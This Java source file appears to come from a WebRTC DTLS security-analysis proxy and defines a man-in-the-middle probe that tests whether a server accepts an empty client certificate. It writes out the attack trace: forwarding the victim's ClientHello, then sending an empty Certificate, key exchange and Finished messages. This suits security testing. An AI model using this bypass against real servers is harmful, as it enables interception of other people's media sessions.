/*
 * WebRTC-DTLS-Analysis-Proxy
 *
 * Copyright 2022-2025 Technology Innovation Institute (TII), Abu Dhabi
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */
package de.rub.nds.dtlsproxy.probes.rtp.dtlsbypass;

import de.rub.nds.dtlsproxy.config.ProxyConfiguration;
import de.rub.nds.dtlsproxy.enums.WebRtcProperties;
import de.rub.nds.dtlsproxy.report.WebRtcPlatformReport;
import de.rub.nds.dtlsproxy.util.TraceUtil;
import de.rub.nds.modifiablevariable.util.Modifiable;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.protocol.message.*;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.ForwardMessagesAction;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveTillAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendDynamicClientKeyExchangeAction;

public class EmptyClientCertBypass extends AuthBypass {

    public EmptyClientCertBypass() {
        super("Ignore client, present empty client certificate", false, true);
    }

    /**
     * Creates a trace based on the assumption that the server accepts empty certificates. The
     * client is left at the CH
     *
     * <pre>
     *
     * Client                    MitM                  Server
     * -------------------------------------------------------
     * |---ClientHello--->|    Receive
     *                           Send     |---ClientHello--->|
     *                       Receive Till |<-----SH Done-----|
     *                           Send     |---attacker CRT-->|
     *                       Dynamic Send |-------CKE------->|
     *                           Send     |----CV,CCS,FIN--->|
     *                       Receive Till |<------FIN--------|
     *
     * </pre>
     */
    @Override
    public WorkflowTrace createTrace(
            WebRtcPlatformReport report, ProxyConfiguration proxyConfiguration) {

        Config config = createConfig(proxyConfiguration, report);

        WorkflowTrace trace =
                TraceUtil.createMitmEntryTrace(
                        config,
                        ATTACKER_TO_SERVER_CONNECTION,
                        CLIENT_TO_ATTACKER_CONNECTION,
                        report);

        // forward Victim CH to Server
        trace.addTlsAction(
                new ForwardMessagesAction(
                        CLIENT_TO_ATTACKER_CONNECTION,
                        ATTACKER_TO_SERVER_CONNECTION,
                        new ClientHelloMessage()));

        // receive Server SH
        trace.addTlsAction(
                new ReceiveTillAction(ATTACKER_TO_SERVER_CONNECTION, new ServerHelloDoneMessage()));

        // send Attacker FIN to server
        CertificateMessage certificateMessage = new CertificateMessage();
        certificateMessage.setCertificatesListBytes(Modifiable.explicit(new byte[0]));
        trace.addTlsAction(new SendAction(ATTACKER_TO_SERVER_CONNECTION, certificateMessage));
        trace.addTlsAction(new SendDynamicClientKeyExchangeAction(ATTACKER_TO_SERVER_CONNECTION));
        trace.addTlsAction(
                new SendAction(
                        ATTACKER_TO_SERVER_CONNECTION,
                        new ChangeCipherSpecMessage(),
                        new FinishedMessage()));

        // receive Server FIN
        trace.addTlsAction(
                new ReceiveTillAction(ATTACKER_TO_SERVER_CONNECTION, new FinishedMessage()));

        return trace;
    }

    @Override
    public boolean isApplicable(WebRtcPlatformReport report) {

        if (!basicExecutionRequirementsMet(report)) {
            return false;
        }
        if (!isTrue(report, WebRtcProperties.SERVER_REQUESTS_CERTIFICATE)) {
            return false;
        }

        if (!isFalse(report, WebRtcProperties.SERVER_NOTICES_EMPTY_CERT)) {
            return false;
        }

        return true;
    }
}
